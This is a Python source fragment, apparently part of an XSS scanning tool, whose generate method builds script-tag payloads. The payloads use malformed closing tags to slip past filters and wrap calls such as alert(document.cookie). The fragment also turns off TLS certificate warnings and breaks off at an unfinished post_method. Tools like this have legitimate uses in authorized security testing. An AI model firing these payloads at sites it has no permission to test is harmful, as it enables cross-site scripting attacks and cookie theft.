from lib.helper.helper import *
from random import randint
from bs4 import BeautifulSoup
from urllib.parse import urljoin,urlparse,parse_qs,urlencode
from lib.helper.Log import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class core:
	
	@classmethod
	def generate(self,eff):	
		FUNCTION=[
			"prompt(5000/200)",
			"alert(6000/3000)",
			"alert(document.cookie)",
			"prompt(document.cookie)",
			"console.log(5000/3000)"
		]
		if eff == 1:
			return "<script/>"+FUNCTION[randint(0,4)]+"<\script\>"
			
		elif eff == 2:
			return "<\script/>"+FUNCTION[randint(0,4)]+"<\\script>"	
			
		elif eff == 3:
			return "<\script\> "+FUNCTION[randint(0,4)]+"<//script>"
			
		elif eff == 4:
			return "<script>"+FUNCTION[randint(0,4)]+"<\script/>"
			
		elif eff == 5:
			return "<script>"+FUNCTION[randint(0,4)]+"<//script>"
			
		elif eff == 6:
			return "<script>"+FUNCTION[randint(0,4)]+"</script>"
			
        @classmethod
	def post_method(self):

